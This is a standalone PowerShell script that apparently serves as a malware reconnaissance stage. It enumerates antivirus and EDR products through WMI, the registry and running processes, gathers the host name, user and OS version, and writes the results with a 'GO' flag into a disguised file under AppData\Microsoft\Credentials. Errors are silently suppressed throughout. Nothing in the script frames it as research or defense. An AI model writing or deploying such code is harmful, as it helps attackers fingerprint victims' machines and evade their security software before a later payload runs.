# checker.ps1 - AV Detection, writes power.txt with GO

$ErrorActionPreference = 'SilentlyContinue'
$appData = [System.IO.Path]::GetFolderPath('ApplicationData')
$powerPath = "$appData\Microsoft\Credentials\power.txt"
$results = @()

# WMI SecurityCenter2
try {
    $av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct
    foreach ($a in $av) {
        $results += "$($a.displayName)|$($a.productState)"
    }
} catch {}

# Registry
$regPaths = @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*")
$keywords = @("defender","norton","mcafee","kaspersky","bitdefender","avast","avg","eset","sophos","trend","webroot","crowdstrike","sentinel","carbon","symantec","malwarebytes","f-secure","comodo")

foreach ($path in $regPaths) {
    try {
        Get-ItemProperty $path | ForEach-Object {
            if ($_.DisplayName) {
                foreach ($kw in $keywords) {
                    if ($_.DisplayName -match $kw) {
                        $results += "$($_.DisplayName)|installed"
                        break
                    }
                }
            }
        }
    } catch {}
}

# Processes
$procs = @("MsMpEng","ccSvcHst","mcshield","kavtray","avpui","bdagent","avgsvc","ekrn","sophos","mbam","cb")
foreach ($p in (Get-Process).Name) {
    foreach ($av in $procs) {
        if ($p -match $av) { $results += "$p|running" }
    }
}

# Build output
$avString = if ($results.Count -gt 0) { $results -join ";" } else { "none" }
$computer = $env:COMPUTERNAME
$user = $env:USERNAME
$os = [System.Environment]::OSVersion.VersionString

$powerText = "AV:$avString`nPC:$computer`nUSR:$user`nOS:$os`nGO"

# Write power.txt
try {
    $dir = Split-Path $powerPath -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [System.IO.File]::WriteAllText($powerPath, $powerText, [System.Text.Encoding]::UTF8)
} catch {
    $powerPath = "$env:USERPROFILE\Desktop\power.txt"
    [System.IO.File]::WriteAllText($powerPath, $powerText, [System.Text.Encoding]::UTF8)
}
